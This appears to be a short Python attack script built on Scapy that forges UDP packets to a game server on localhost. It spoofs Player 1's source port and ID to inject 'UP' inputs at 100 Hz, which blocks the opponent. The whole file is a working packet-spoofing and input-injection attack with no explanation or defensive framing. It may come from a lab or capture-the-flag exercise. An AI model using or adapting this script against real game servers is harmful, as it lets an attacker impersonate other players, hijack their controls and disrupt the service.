from scapy.all import *
import struct
import time

def send_fake_input(server_ip, server_port, fake_source_port, player_id, input_value):
    payload = struct.pack('BBB', 0x02, player_id, input_value)
    packet = IP(src="127.0.0.1", dst=server_ip) / \
             UDP(sport=fake_source_port, dport=server_port) / \
             Raw(load=payload)
    send(packet, verbose=0)

def attack_block_opponent():
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 12345
    TARGET_PORT = 46669  # Port de Player 1
    TARGET_ID = 1
    
    print("[*] Attacking Player 1...")
    print("[*] Sending UP inputs at 100 Hz...")
    
    try:
        while True:
            send_fake_input(SERVER_IP, SERVER_PORT, TARGET_PORT, TARGET_ID, 1)  # 1 = UP
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted")

if __name__ == "__main__":
    attack_block_opponent()